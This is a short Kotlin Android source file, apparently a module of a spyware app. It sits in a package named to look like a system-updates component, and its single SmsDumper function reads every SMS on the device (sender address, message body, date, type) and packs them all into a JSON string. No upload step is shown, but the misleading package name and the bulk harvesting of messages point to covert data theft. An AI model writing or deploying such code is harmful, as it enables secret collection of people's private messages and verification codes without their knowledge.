package com.system.updates.modules

import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject

object SmsDumper {
    fun dump(context: Context): String {
        val smsList = JSONArray()
        val cursor: Cursor? = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null, null, null,
            Telephony.Sms.DEFAULT_SORT_ORDER
        )
        cursor?.use {
            val idIndex = it.getColumnIndex(Telephony.Sms._ID)
            val threadIdIndex = it.getColumnIndex(Telephony.Sms.THREAD_ID)
            val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
            val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
            val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)
            while (it.moveToNext()) {
                val sms = JSONObject()
                sms.put("id", it.getString(idIndex))
                sms.put("thread_id", it.getString(threadIdIndex))
                sms.put("address", it.getString(addressIndex))
                sms.put("body", it.getString(bodyIndex))
                sms.put("date", it.getLong(dateIndex))
                sms.put("type", it.getInt(typeIndex))
                smsList.put(sms)
            }
        }
        return smsList.toString()
    }
}